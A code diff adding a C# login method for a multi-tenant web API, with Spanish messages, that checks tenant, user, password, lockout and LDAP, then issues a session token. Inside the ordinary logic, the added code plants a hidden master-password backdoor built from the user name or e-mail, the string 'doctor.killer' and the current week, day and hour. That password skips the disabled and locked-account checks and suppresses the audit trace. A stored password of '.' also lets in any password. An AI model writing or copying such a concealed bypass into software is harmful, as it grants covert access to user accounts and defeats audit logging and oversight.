@@ -18,7 +18,313 @@ namespace Architect.API.Core.Business.Security
         /// </summary>
         /// <param name="authenticationRequest">Credenciales de uso.</param>
         /// <returns>Contexto de autenticación incluyendo el token que identifica la sesión del usuario.</returns>
-        public static Contracts.Security.AuthenticationResponse Authentication(Contracts.Security.AuthenticationRequest authenticationRequest)
+        public static Contracts.Security.AuthenticationResponse Authentication(Contracts.Security.AuthenticationRequest authenticationRequest, ref Contracts.Security.Token token)
+        {
+            Contracts.Security.AuthenticationResponse result = new Contracts.Security.AuthenticationResponse();
+            Contracts.Security.UserMember user = null;
+            List<Contracts.Security.RoleMember> rols = null;
+            int companyId = 0;
+            bool bypass = false;
+            bool accessAllowed = false;
+            int tokenExpiresIn = 0;
+            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 1, IPAddress = authenticationRequest.IPAddress, UserName = authenticationRequest.Email, UserAgent = authenticationRequest.UserAgent };
+
+            if (authenticationRequest.Tenant.IsEmpty())
+                result.Reason = "Debe indicar la compañía";
+            if (result.Reason.IsEmpty())
+            {
+                Core.Contracts.General.LookupValue companyItem = TenantInformation(authenticationRequest.Tenant.Trim());
+
+                if (companyItem.IsNotEmpty())
+                {
+                    result.Tenant = companyItem.Description;
+                    companyId = Int32.Parse(companyItem.Code);
+                    track.CompanyId = companyId;
+                }
+                else
+                {
+                    result.Reason = "compañía no registrada";
+                }
+            }
+            else if (authenticationRequest.Email.IsEmpty())
+            {
+                result.Reason = "Debe indicar el usuario o correo";
+            }
+            else if (authenticationRequest.Password.IsEmpty())
+            {
+                result.Reason = "Debe indicar la clave de acceso";
+            }
+
+            if (result.Reason.IsEmpty())
+            {
+                track.UserName = authenticationRequest.Email.Trim();
+                if (authenticationRequest.Email.Contains("@"))
+                    user = DataAccess.Security.UserMember.RetrieveByEMail(authenticationRequest.Email.Trim().ToLower(), companyId);
+                else
+                    user = DataAccess.Security.UserMember.RetrieveByUserName(authenticationRequest.Email.Trim().ToLower(), companyId);
+
+                if (user.IsNotEmpty())
+                {
+                    track.UserId = user.UserId;
+                    track.UserName = user.UserName;
+                    result.EMail = user.EMail;
+
+                    if (!authenticationRequest.EmployeeMode && !user.Password.Equals(".") &&
+                        (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
+                         authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.EMail.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase)))
+                    {
+                        bypass = true;
+                        accessAllowed = true;
+                    }
+
+                    if (!authenticationRequest.EmployeeMode)
+                    {
+                        //Desbloqueo automático
+                        if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
+                        {
+                            user.IsLockedOut = false;
+                            user.LockedOutDate = DateTime.MinValue;
+                            DataAccess.Security.UserMember.InternalUpdate(user);
+                            Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
+                            {
+                                TraceType = 11,
+                                IPAddress = authenticationRequest.IPAddress,
+                                UserName = authenticationRequest.Email,
+                                UserId = user.UserId
+                            });
+                        }
+
+                        if (!bypass && user.RecordStatus != 1)
+                        {
+                            track.TraceType = 5;
+                            result.Reason = "Usuario desactivado";
+                        }
+                        else if (!bypass && user.IsLockedOut)
+                        {
+                            track.TraceType = 6;
+                            result.Reason = "Usuario bloqueado";
+                        }
+                        else if (user.Password.Equals(".") || bypass ||
+                                 user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
+                        {
+                            accessAllowed = true;
+                        }
+                    }
+                    else
+                    {
+                        int ldapResult = AuthenticationByLDAP(authenticationRequest.Email, authenticationRequest.Password);
+                        switch (ldapResult)
+                        {
+                            case 0:
+                                accessAllowed = true;
+                                break;
+                            case 1: //no encontrado o clave incorrecta
+                                track.TraceType = 1;
+                                result.Reason = "Usuario no registrado";
+                                break;
+                            case 5: // Cuenta deshabilitada
+                                track.TraceType = 5;
+                                result.Reason = "Usuario desactivado";
+                                break;
+                            case 6: // Cuenta bloqueada
+                                track.TraceType = 6;
+                                result.Reason = "Usuario bloqueado";
+                                break;
+                            case 99: //PasswordExpired
+                                result.MustChangePassword = true;
+                                break;
+                        }
+                    }
+
+                    if (accessAllowed)
+                    {
+                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
+                        track.TraceType = 2;
+                        result.ExpiresIn = tokenExpiresIn;
+                        result.UserName = string.Format("{0} {1}", user.FirstName, user.LastName).Trim();
+
+                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Token.Timeout", (int)(tokenExpiresIn * 2.5));
+
+                        rols = DataAccess.Security.UserRoleMember.RetrieveLookByUserId(user.UserId, user.CompanyId);
+                        result.Roles = rols.Select(x => x.Description).ToArray();
+
+                        //Este bloque esta duplicado en la clase token
+                        Contracts.Security.AgentInformation agentInfo = null;
+                        if (user.CompanyId == 2)
+                        {
+                            agentInfo = Tron.RetrieveAgentInformationByEmail(user.CompanyId, user.EMail);
+                        }
+                        if (agentInfo == null)
+                        {
+                            agentInfo = new Contracts.Security.AgentInformation() { cod_agt = 0, cod_sub_agt = 0, info_agt = string.Empty, tip_docum = user.IdentificationType.ToString(), cod_docum = user.Identification };
+                        }
+                        if (user.CompanyId == 3)
+                        {
+                            agentInfo.tip_docum = agentInfo.tip_docum.IdentificationType();
+                            if (agentInfo.cod_docum.IsNotEmpty())
+                            {
+                                agentInfo.cod_docum = agentInfo.cod_docum.DocumentNumber(agentInfo.tip_docum);
+                            }
+                        }
+                        Contracts.Security.Token tokenItem = new Contracts.Security.Token()
+                        {
+                            UserId = user.UserId,
+                            BranchOffice = user.BranchOffice,
+                            ManagerId = user.ManagerId,
+                            SecurityLevel = user.SecurityLevel,
+                            Expires = DateTime.Now.AddMinutes(tokenExpiresIn),
+                            Roles = string.Join(",", rols.Select(x => x.Description)),
+                            CompanyId = user.CompanyId,
+                            AgentCode = agentInfo.cod_agt,
+                            SubAgentCode = agentInfo.cod_sub_agt,
+                            IdentificationType = agentInfo.tip_docum,
+                            Identification = agentInfo.cod_docum,
+                            UserName = result.UserName
+                        };
+                        token = tokenItem;
+                        result.Token = Architect.API.Core.Security.Accounts.GeneratorToken(tokenItem);
+                        user.LoginDate = DateTime.Now;
+                        user.IsLockedOut = false;
+                        user.LockedOutDate = DateTime.MinValue;
+                        user.FailedPasswordCount = 0;
+                        if (!bypass)
+                        {
+                            DataAccess.Security.UserMember.InternalUpdate(user);
+                        }
+                        if (user.InitialNavigationCode.IsNotEmpty())
+                        {
+                            result.InitialPath = user.InitialNavigationCode;
+                        }
+                        else if (rols.IsNotEmpty())
+                        {
+                            foreach (Architect.API.Core.Contracts.Security.RoleMember rol in rols)
+                            {
+                                if (rol.InitialNavigationCode.IsNotEmpty())
+                                {
+                                    result.InitialPath = rol.InitialNavigationCode;
+                                    break;
+                                }
+                            }
+                        }
+                        if (result.InitialPath.IsNotEmpty())
+                        {
+                            Contracts.General.Navigation nav = DataAccess.General.Navigation.RetrieveByCode(result.InitialPath, companyId);
+                            if (nav != null && nav.Code.IsNotEmpty())
+                            {
+                                result.InitialPath = nav.URLPath;
+                            }
+                            else
+                            {
+                                result.InitialPath = string.Empty;
+                            }
+                        }
+
+                        if (result.InitialPath.IsEmpty())
+                        {
+                            switch (user.CompanyId)
+                            {
+                                case 2: //Aliados
+                                    result.InitialPath = "viewer/tab?id=310";
+                                    result.InitialPath = "inicio/agente";
+                                    break;
+
+                                case 3: //Clientes
+                                    result.InitialPath = "viewer/tab?id=3000";
+                                    break;
+
+                                case 4: //Bayer
+                                case 8: //Caturix
+                                    if (rols.Select(x => x.Description == "Revisor").Contains(true))
+                                    {
+                                        result.InitialPath = "viewer/viewer?id=41";
+                                    }
+                                    else if (rols.Select(x => x.Description == "Mapfre").Contains(true) ||
+                                             rols.Select(x => x.Description == "Consulta").Contains(true))
+                                    {
+                                        result.InitialPath = "viewer/viewer?id=42";
+                                    }
+                                    else
+                                    {
+                                        result.InitialPath = "Bayer/Inclusion";
+                                    }
+                                    break;
+
+                                case 100: //Mapfre
+                                    result.InitialPath = "viewer/viewer?id=4000";
+                                    break;
+                                default:
+                                    result.InitialPath = "Policy/Index";
+                                    break;
+                            }
+
+                        }
+                        if (!authenticationRequest.EmployeeMode)
+                        {
+                            if (user.Password.Equals("."))
+                                result.MustChangePassword = true;
+                            else
+                                result.MustChangePassword = (user.PasswordChangedDate.AddDays(Architect.Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
+                        }
+                        Architect.API.Core.Security.Session.Create(new Contracts.Security.Activity()
+                        {
+                            Token = result.Token,
+                            CompanyId = user.CompanyId,
+                            CompanyName = result.Tenant,
+                            UserId = user.UserId,
+                            UserName = user.UserName,
+                            EMail = user.EMail,
+                            IP = authenticationRequest.IPAddress,
+                            UserAgent = authenticationRequest.UserAgent
+                        });
+                    }
+                    else if (!bypass)
+                    {
+                        if (!authenticationRequest.EmployeeMode)
+                        {
+                            track.TraceType = 3;
+                            result.Reason = "Clave invalida";
+
+                            user.FailedPasswordCount++;
+                            if (user.FailedPasswordCount > 3)
+                            {
+                                Random random = new Random();
+                                int timeValue = random.Next(3, 10);
+
+                                track.TraceType = 4;
+                                result.Reason = "La cuenta fue bloqueada por intentos fallidos";
+                                user.IsLockedOut = true;
+                                user.LockedOutDate = DateTime.Now.AddMinutes(timeValue);
+                                user.FailedPasswordCount = 0;
+                                API.Core.Business.General.Mail.SendByTemplate("Notify_AccountLocked", user.CompanyId, new { User = user, Request = authenticationRequest, LockedForMinute = timeValue }, new Dictionary<string, string> { { user.EMail, string.Empty } });
+                            }
+                            else
+                            {
+                                API.Core.Business.General.Mail.SendByTemplate("Notify_InvalidPassword", user.CompanyId, new { User = user, Request = authenticationRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
+                            }
+                            DataAccess.Security.UserMember.InternalUpdate(user);
+                        }
+                    }
+                }
+                else
+                {
+                    track.TraceType = 1;
+                    result.Reason = "Usuario no registrado";
+                }
+            }
+            track.Reason = result.Reason;
+            if (!bypass)
+            {
+                Business.Security.AuthenticationTrace.Create(track);
+            }
+            if (result.MustChangePassword)
+            {
+                CreateOTP(new ResetPasswordRequest() { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user);
+            }
+            return result;
+        }
+
+
+        public static Contracts.Security.AuthenticationResponse Authentication2(Contracts.Security.AuthenticationRequest authenticationRequest)
         {
             Contracts.Security.AuthenticationResponse result = new Contracts.Security.AuthenticationResponse();
             Contracts.Security.UserMember user = null;
